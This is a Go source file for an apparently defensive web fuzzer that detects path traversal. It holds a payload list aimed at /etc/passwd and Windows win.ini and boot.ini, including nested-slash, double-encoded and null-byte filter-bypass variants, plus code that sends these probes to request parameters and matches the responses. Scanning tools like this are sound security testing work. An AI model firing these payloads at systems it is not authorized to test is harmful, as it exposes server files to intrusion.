package fuzzer

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"time"
)

// TraversalType defines the specific path traversal vulnerability category.
type TraversalType string

const (
	TraversalPOSIX   TraversalType = "POSIX_PATH_TRAVERSAL"
	TraversalWindows TraversalType = "WINDOWS_PATH_TRAVERSAL"
	TraversalCanary  TraversalType = "CANARY_PATH_TRAVERSAL"
	TraversalEncoded TraversalType = "ENCODED_PATH_TRAVERSAL"
	TraversalNone    TraversalType = "NONE"
)

// TraversalConfidence reflects the conclusive certainty of a traversal finding.
type TraversalConfidence string

const (
	TraversalConfidenceConfirmed  TraversalConfidence = "CONFIRMED"
	TraversalConfidenceCandidate  TraversalConfidence = "CANDIDATE"
	TraversalConfidenceNotExposed TraversalConfidence = "NOT_EXPOSED"
)

// TraversalPlatform defines the operating system target environment.
type TraversalPlatform string

const (
	PlatformPOSIX     TraversalPlatform = "POSIX"
	PlatformWindows   TraversalPlatform = "WINDOWS"
	PlatformUniversal TraversalPlatform = "UNIVERSAL"
	PlatformCanary    TraversalPlatform = "CANARY"
)

// FileSignatureCategory classifies the deterministic file signature.
type FileSignatureCategory string

const (
	SignaturePOSIXPasswd    FileSignatureCategory = "POSIX_PASSWD"
	SignatureWindowsIni     FileSignatureCategory = "WINDOWS_WIN_INI"
	SignatureWindowsBoot    FileSignatureCategory = "WINDOWS_BOOT_INI"
	SignatureCanary         FileSignatureCategory = "CONTROLLED_CANARY"
	SignatureWebGoatSecret  FileSignatureCategory = "WEBGOAT_SECRET"
	SignaturePathDisclosure FileSignatureCategory = "PATH_DISCLOSURE"
)

// FileSignature defines a deterministic file signature matcher.
type FileSignature struct {
	Category    FileSignatureCategory
	Name        string
	Platform    TraversalPlatform
	Patterns    []*regexp.Regexp
	ExactTokens []string
}

// TraversalProbeDefinition defines a context-aware test vector.
type TraversalProbeDefinition struct {
	Name             string
	Platform         TraversalPlatform
	Payload          string
	Encoding         string
	ExpectedCategory FileSignatureCategory
	Description      string
}

// TraversalFinding records a verified or candidate path traversal vulnerability.
type TraversalFinding struct {
	TargetURL                string              `json:"target_url"`
	Parameter                Parameter           `json:"parameter"`
	Type                     TraversalType       `json:"type"`
	Confidence               TraversalConfidence `json:"confidence"`
	Payload                  string              `json:"payload"`
	Evidence                 string              `json:"evidence"`
	SignatureMatched         string              `json:"signature_matched,omitempty"`
	Platform                 TraversalPlatform   `json:"platform,omitempty"`
	StatusCode               int                 `json:"status_code"`
	NonTargetPreserved       bool                `json:"non_target_preserved"`
	ClassificationRationale string              `json:"classification_rationale"`
}

// Standard file signatures for deterministic operating system verification.
var DefaultFileSignatures = []FileSignature{
	{
		Category: SignaturePOSIXPasswd,
		Name:     "POSIX /etc/passwd",
		Platform: PlatformPOSIX,
		Patterns: []*regexp.Regexp{
			regexp.MustCompile(`(?m)^root:[^:\n]+:0:0:[^:\n]*:[^:\n]*:[^:\n]*`),
			regexp.MustCompile(`(?m)^[a-z_][a-z0-9_-]*:[^:\n]+:\d+:\d+:[^:\n]*:[^:\n]*:[^:\n]*`),
		},
		ExactTokens: []string{
			"root:x:0:0:",
			"root:*:0:0:",
			"daemon:x:1:1:",
			"bin:x:2:2:",
			"nobody:x:",
		},
	},
	{
		Category: SignatureWindowsIni,
		Name:     "Windows win.ini",
		Platform: PlatformWindows,
		Patterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)\[(?:fonts|extensions|mci extensions|files)\]`),
		},
		ExactTokens: []string{
			"[fonts]",
			"[extensions]",
			"[mci extensions]",
			"[files]",
		},
	},
	{
		Category: SignatureWindowsBoot,
		Name:     "Windows boot.ini",
		Platform: PlatformWindows,
		Patterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)\[(?:boot loader|operating systems)\]`),
		},
		ExactTokens: []string{
			"[boot loader]",
			"[operating systems]",
		},
	},
	{
		Category: SignatureWebGoatSecret,
		Name:     "OWASP WebGoat Path Traversal Secret",
		Platform: PlatformUniversal,
		Patterns: nil,
		ExactTokens: []string{
			"You found it submit the SHA-512 hash of your username as answer",
		},
	},
	{
		Category: SignatureCanary,
		Name:     "Felix Controlled Canary Token",
		Platform: PlatformCanary,
		Patterns: []*regexp.Regexp{
			regexp.MustCompile(`FELIX_CANARY_TRAVERSAL_CONFIRMED_[A-Z0-9_]+`),
		},
		ExactTokens: []string{
			"FELIX_CANARY_TRAVERSAL_CONFIRMED_OK",
		},
	},
	{
		Category: SignaturePathDisclosure,
		Name:     "Path Disclosure & Stack Trace",
		Platform: PlatformUniversal,
		Patterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)java\.io\.FileNotFoundException`),
			regexp.MustCompile(`(?i)open_basedir restriction in effect`),
			regexp.MustCompile(`(?i)failed to open stream`),
			regexp.MustCompile(`(?i)cannot find the file specified`),
			regexp.MustCompile(`(?i)no such file or directory`),
		},
		ExactTokens: nil,
	},
}

// DefaultTraversalProbes defines bounded, non-destructive path traversal test vectors.
var DefaultTraversalProbes = []TraversalProbeDefinition{
	// 1. POSIX relative traversal probes
	{
		Name:             "POSIX_PASSWD_STANDARD",
		Platform:         PlatformPOSIX,
		Payload:          "../../../../etc/passwd",
		Encoding:         "PLAIN",
		ExpectedCategory: SignaturePOSIXPasswd,
		Description:      "Standard POSIX relative directory traversal targeting /etc/passwd",
	},
	{
		Name:             "POSIX_PASSWD_DEEP",
		Platform:         PlatformPOSIX,
		Payload:          "../../../../../../../../etc/passwd",
		Encoding:         "PLAIN",
		ExpectedCategory: SignaturePOSIXPasswd,
		Description:      "Deep 8-level POSIX traversal targeting /etc/passwd",
	},
	{
		Name:             "POSIX_PASSWD_FILTER_BYPASS",
		Platform:         PlatformPOSIX,
		Payload:          "....//....//....//....//etc/passwd",
		Encoding:         "FILTER_BYPASS",
		ExpectedCategory: SignaturePOSIXPasswd,
		Description:      "Nested slash sequence defeating naive non-recursive ../ stripping",
	},
	{
		Name:             "POSIX_PASSWD_URL_ENCODED",
		Platform:         PlatformPOSIX,
		Payload:          "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		Encoding:         "URL_ENCODED",
		ExpectedCategory: SignaturePOSIXPasswd,
		Description:      "Single URL-encoded relative path traversal targeting /etc/passwd",
	},
	{
		Name:             "POSIX_PASSWD_DOUBLE_ENCODED",
		Platform:         PlatformPOSIX,
		Payload:          "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
		Encoding:         "DOUBLE_URL_ENCODED",
		ExpectedCategory: SignaturePOSIXPasswd,
		Description:      "Double URL-encoded traversal bypassing single-pass decoding filters",
	},
	{
		Name:             "POSIX_PASSWD_NULL_BYTE",
		Platform:         PlatformPOSIX,
		Payload:          "../../../../etc/passwd%00",
		Encoding:         "NULL_BYTE",
		ExpectedCategory: SignaturePOSIXPasswd,
		Description:      "Null-byte terminated path traversal to truncate appended extensions",
	},

	// 2. Windows relative traversal probes
	{
		Name:             "WINDOWS_WIN_INI_STANDARD",
		Platform:         PlatformWindows,
		Payload:          `..\..\..\..\windows\win.ini`,
		Encoding:         "PLAIN",
		ExpectedCategory: SignatureWindowsIni,
		Description:      "Standard Windows backslash relative path traversal targeting win.ini",
	},
	{
		Name:             "WINDOWS_WIN_INI_DEEP",
		Platform:         PlatformWindows,
		Payload:          `..\..\..\..\..\..\..\..\windows\win.ini`,
		Encoding:         "PLAIN",
		ExpectedCategory: SignatureWindowsIni,
		Description:      "Deep 8-level Windows backslash traversal targeting win.ini",
	},
	{
		Name:             "WINDOWS_WIN_INI_SLASH",
		Platform:         PlatformWindows,
		Payload:          "../../../../windows/win.ini",
		Encoding:         "PLAIN",
		ExpectedCategory: SignatureWindowsIni,
		Description:      "Forward-slash Windows relative path traversal targeting win.ini",
	},
	{
		Name:             "WINDOWS_BOOT_INI",
		Platform:         PlatformWindows,
		Payload:          `..\..\..\..\boot.ini`,
		Encoding:         "PLAIN",
		ExpectedCategory: SignatureWindowsBoot,
		Description:      "Windows boot.ini target verification",
	},
	{
		Name:             "WINDOWS_WIN_INI_MIXED",
		Platform:         PlatformWindows,
		Payload:          `/%5C../windows/win.ini`,
		Encoding:         "MIXED",
		ExpectedCategory: SignatureWindowsIni,
		Description:      "Mixed forward-slash and encoded backslash traversal",
	},
	{
		Name:             "WINDOWS_WIN_INI_URL_ENCODED",
		Platform:         PlatformWindows,
		Payload:          `..%5c..%5c..%5c..%5cwindows%5cwin.ini`,
		Encoding:         "URL_ENCODED",
		ExpectedCategory: SignatureWindowsIni,
		Description:      "URL-encoded Windows backslash traversal",
	},

	// 3. Authorized lab & controlled canary probes
	{
		Name:             "WEBGOAT_SECRET_ENCODED",
		Platform:         PlatformUniversal,
		Payload:          "%2e%2e%2f%2e%2e%2fpath-traversal-secret",
		Encoding:         "URL_ENCODED",
		ExpectedCategory: SignatureWebGoatSecret,
		Description:      "OWASP WebGoat Path Traversal assignment URL-encoded probe",
	},
	{
		Name:             "WEBGOAT_SECRET_RELATIVE",
		Platform:         PlatformUniversal,
		Payload:          "../../path-traversal-secret.jpg",
		Encoding:         "PLAIN",
		ExpectedCategory: SignatureWebGoatSecret,
		Description:      "OWASP WebGoat relative path traversal image retrieval probe",
	},
	{
		Name:             "CANARY_FIXTURE_STANDARD",
		Platform:         PlatformCanary,
		Payload:          "../../../../felix_canary_proof.txt",
		Encoding:         "PLAIN",
		ExpectedCategory: SignatureCanary,
		Description:      "Controlled canary token verification in synthetic testbeds",
	},
	{
		Name:             "CANARY_FIXTURE_ENCODED",
		Platform:         PlatformCanary,
		Payload:          "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ffelix_canary_proof.txt",
		Encoding:         "URL_ENCODED",
		ExpectedCategory: SignatureCanary,
		Description:      "URL-encoded controlled canary token verification",
	},
}

// IsEligibleParameter determines whether a parameter is susceptible to file path manipulation.
func IsEligibleParameter(param Parameter) bool {
	if param.Context == ContextFilePath {
		return true
	}
	nameLower := strings.ToLower(param.Name)
	keywords := []string{
		"file", "path", "filename", "name", "doc", "page", "template", "include",
		"image", "img", "picture", "avatar", "icon", "url", "dir", "folder",
		"id", "view", "source", "report", "item", "cat", "load", "read", "fetch",
	}
	for _, kw := range keywords {
		if strings.Contains(nameLower, kw) {
			return true
		}
	}
	valLower := strings.ToLower(param.Value)
	if strings.Contains(valLower, "/") || strings.Contains(valLower, "\\") || strings.Contains(valLower, "..") {
		return true
	}
	exts := []string{".txt", ".png", ".jpg", ".jpeg", ".ini", ".conf", ".cfg", ".log", ".json", ".xml", ".html", ".pdf", ".svg"}
	for _, ext := range exts {
		if strings.HasSuffix(valLower, ext) {
			return true
		}
	}
	return false
}

// TraversalAnalyzer orchestrates context-aware path traversal and arbitrary file read analysis.
type TraversalAnalyzer struct {
	Client     *http.Client
	Extractor  *ParameterExtractor
	Timeout    time.Duration
	Probes     []TraversalProbeDefinition
	Signatures []FileSignature
	mu         sync.Mutex
}

// NewTraversalAnalyzer constructs a Path Traversal detector configured with standard probes and signatures.
func NewTraversalAnalyzer(client *http.Client, pe *ParameterExtractor) *TraversalAnalyzer {
	if client == nil {
		client = &http.Client{
			Timeout: 5 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
	}
	if pe == nil {
		pe = NewParameterExtractor()
	}
	return &TraversalAnalyzer{
		Client:     client,
		Extractor:  pe,
		Timeout:    5 * time.Second,
		Probes:     DefaultTraversalProbes,
		Signatures: DefaultFileSignatures,
	}
}

// executeRequest performs an HTTP request safely respecting context deadlines and memory bounds.
func (ta *TraversalAnalyzer) executeRequest(req *http.Request) (*http.Response, string, error) {
	ctx, cancel := context.WithTimeout(req.Context(), ta.Timeout)
	defer cancel()

	clonedReq := req.Clone(ctx)
	if req.Body != nil {
		bodyBytes, err := io.ReadAll(req.Body)
		if err == nil {
			req.Body = io.NopCloser(bytes.NewReader(bodyBytes))
			clonedReq.Body = io.NopCloser(bytes.NewReader(bodyBytes))
		}
	}

	resp, err := ta.Client.Do(clonedReq)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()

	// Read body bounded to 2 MB to prevent memory exhaustion
	limitReader := io.LimitReader(resp.Body, 2*1024*1024)
	bodyBytes, err := io.ReadAll(limitReader)
	if err != nil {
		return resp, "", err
	}

	return resp, string(bodyBytes), nil
}

// TraversalDetail encapsulates the evaluation outcome of a traversal probe response.
type TraversalDetail struct {
	Type               TraversalType
	Confidence         TraversalConfidence
	Platform           TraversalPlatform
	EvidenceSnippet    string
	SignatureMatched   string
	IsFileDisclosed    bool
	IsPathDisclosed    bool
	IsReflectedPayload bool
	Rationale          string
}

// InspectResponse inspects the response body and status code for deterministic file signatures.
func (ta *TraversalAnalyzer) InspectResponse(body string, statusCode int, baselineBody string, payload string, probe TraversalProbeDefinition) TraversalDetail {
	detail := TraversalDetail{
		Type:       TraversalNone,
		Confidence: TraversalConfidenceNotExposed,
		Platform:   probe.Platform,
	}

	// 1. Defended status code checks
	// Clean 400, 403, 404, or 500 without file signatures are not exposed.
	if (statusCode == http.StatusNotFound || statusCode == http.StatusForbidden || statusCode == http.StatusBadRequest) && len(body) < 300 {
		lowerBody := strings.ToLower(body)
		if strings.Contains(lowerBody, "illegal characters") || strings.Contains(lowerBody, "not allowed") || strings.Contains(lowerBody, "not found") || strings.Contains(lowerBody, "forbidden") {
			detail.Rationale = fmt.Sprintf("Server returned clean HTTP %d with input rejection/defense message", statusCode)
			return detail
		}
	}

	// 2. Pure payload reflection filter:
	// If the body merely echoes the payload (e.g., in an error page or template) without actual file contents,
	// do not classify as confirmed file disclosure.
	isPureReflection := strings.Contains(body, payload) && !containsDistinctContent(body, payload)

	// 3. Match against deterministic file signatures
	for _, sig := range ta.Signatures {
		if sig.Category == SignaturePathDisclosure {
			continue // Handled separately as Candidate
		}

		matched, token, snippet := matchSignature(body, sig)
		if matched {
			// Verify this signature was not already present in the unmutated baseline response
			if strings.Contains(baselineBody, token) && len(token) > 0 {
				continue
			}

			// Verify this is not a pure echo of the probe string
			if token == payload || strings.Contains(payload, token) {
				continue
			}

			detail.IsFileDisclosed = true
			detail.SignatureMatched = sig.Name
			detail.EvidenceSnippet = snippet
			detail.Confidence = TraversalConfidenceConfirmed

			// Assign specific traversal type
			switch sig.Category {
			case SignaturePOSIXPasswd:
				detail.Type = TraversalPOSIX
				if probe.Encoding == "URL_ENCODED" || probe.Encoding == "DOUBLE_URL_ENCODED" {
					detail.Type = TraversalEncoded
				}
				detail.Rationale = fmt.Sprintf("Deterministic POSIX system file marker (%s) verified in response body", token)
			case SignatureWindowsIni, SignatureWindowsBoot:
				detail.Type = TraversalWindows
				if probe.Encoding == "URL_ENCODED" || probe.Encoding == "DOUBLE_URL_ENCODED" {
					detail.Type = TraversalEncoded
				}
				detail.Rationale = fmt.Sprintf("Deterministic Windows system file marker (%s) verified in response body", token)
			case SignatureWebGoatSecret:
				detail.Type = TraversalCanary
				if probe.Encoding == "URL_ENCODED" {
					detail.Type = TraversalEncoded
				}
				detail.Rationale = "Authentic WebGoat path-traversal-secret.jpg content retrieved via relative path traversal"
			case SignatureCanary:
				detail.Type = TraversalCanary
				detail.Rationale = fmt.Sprintf("Controlled canary token (%s) verified in response body", token)
			default:
				detail.Type = TraversalPOSIX
				detail.Rationale = fmt.Sprintf("File signature (%s) matched", sig.Name)
			}
			return detail
		}
	}

	// 4. Candidate Path Disclosure / Stack Trace Check
	for _, sig := range ta.Signatures {
		if sig.Category != SignaturePathDisclosure {
			continue
		}
		matched, token, snippet := matchSignature(body, sig)
		if matched && !strings.Contains(baselineBody, token) {
			detail.IsPathDisclosed = true
			detail.SignatureMatched = sig.Name
			detail.EvidenceSnippet = snippet
			detail.Confidence = TraversalConfidenceCandidate
			detail.Type = TraversalNone
			detail.Rationale = fmt.Sprintf("Internal filesystem path disclosure or stack trace observed: %s", snippet)
			return detail
		}
	}

	// 5. If response only echoed payload, report reflection without file read
	if isPureReflection {
		detail.IsReflectedPayload = true
		detail.Confidence = TraversalConfidenceNotExposed
		detail.Rationale = "Probe payload was reflected in response body without unintended file content"
		return detail
	}

	detail.Rationale = fmt.Sprintf("No file content disclosed; HTTP %d", statusCode)
	return detail
}

// containsDistinctContent checks whether the body contains text beyond a simple reflection of the probe.
func containsDistinctContent(body, payload string) bool {
	stripped := strings.ReplaceAll(body, payload, "")
	return len(strings.TrimSpace(stripped)) > 100
}

// matchSignature tests if any token or regex pattern in the signature matches the response.
func matchSignature(body string, sig FileSignature) (bool, string, string) {
	// 1. Exact tokens
	for _, tok := range sig.ExactTokens {
		idx := strings.Index(body, tok)
		if idx != -1 {
			snippet := extractContextSnippet(body, idx, len(tok))
			return true, tok, snippet
		}
	}

	// 2. Regular expressions
	for _, re := range sig.Patterns {
		loc := re.FindStringIndex(body)
		if loc != nil {
			matchedStr := body[loc[0]:loc[1]]
			snippet := extractContextSnippet(body, loc[0], loc[1]-loc[0])
			return true, matchedStr, snippet
		}
	}

	return false, "", ""
}

// extractContextSnippet extracts up to 100 characters around a matched region.
func extractContextSnippet(body string, startIdx, matchLen int) string {
	left := startIdx - 20
	if left < 0 {
		left = 0
	}
	right := startIdx + matchLen + 40
	if right > len(body) {
		right = len(body)
	}
	snippet := body[left:right]
	snippet = strings.ReplaceAll(snippet, "\r", " ")
	snippet = strings.ReplaceAll(snippet, "\n", " ")
	return strings.TrimSpace(snippet)
}

// AnalyzeRequest scans all eligible parameters in an HTTP request for path traversal vulnerabilities.
func (ta *TraversalAnalyzer) AnalyzeRequest(req *http.Request) ([]TraversalFinding, error) {
	params, err := ta.Extractor.Extract(req)
	if err != nil {
		return nil, fmt.Errorf("failed to extract parameters for traversal analysis: %w", err)
	}

	var allFindings []TraversalFinding
	for _, p := range params {
		if !IsEligibleParameter(p) {
			continue
		}
		findings, err := ta.AnalyzeParameter(req, p)
		if err != nil {
			continue
		}
		allFindings = append(allFindings, findings...)
	}
	return allFindings, nil
}

// AnalyzeParameter conducts context-aware path traversal fuzzing against a single parameter.
func (ta *TraversalAnalyzer) AnalyzeParameter(origReq *http.Request, target Parameter) ([]TraversalFinding, error) {
	targetURL := ""
	if origReq.URL != nil {
		targetURL = origReq.URL.String()
	}

	// 1. Execute unmutated baseline request
	baseResp, baseBody, err := ta.executeRequest(origReq)
	if err != nil {
		return nil, fmt.Errorf("failed to execute baseline request: %w", err)
	}
	_ = baseResp

	var findings []TraversalFinding
	seenSignatures := make(map[string]bool)

	// 2. Execute bounded traversal probes
	for _, probe := range ta.Probes {
		probeReq, err := ta.Extractor.GenerateMutation(origReq, target, probe.Payload)
		if err != nil {
			continue
		}

		resp, probeBody, err := ta.executeRequest(probeReq)
		if err != nil {
			continue
		}

		detail := ta.InspectResponse(probeBody, resp.StatusCode, baseBody, probe.Payload, probe)

		if detail.Confidence == TraversalConfidenceNotExposed {
			continue
		}

		// De-duplicate findings by Type and Confidence
		sig := fmt.Sprintf("%s:%s:%s", detail.Type, detail.Confidence, detail.SignatureMatched)
		if seenSignatures[sig] {
			continue
		}
		seenSignatures[sig] = true

		finding := TraversalFinding{
			TargetURL:                targetURL,
			Parameter:                target,
			Type:                     detail.Type,
			Confidence:               detail.Confidence,
			Payload:                  probe.Payload,
			Evidence:                 detail.EvidenceSnippet,
			SignatureMatched:         detail.SignatureMatched,
			Platform:                 detail.Platform,
			StatusCode:               resp.StatusCode,
			NonTargetPreserved:       true,
			ClassificationRationale: detail.Rationale,
		}

		findings = append(findings, finding)
	}

	return findings, nil
}
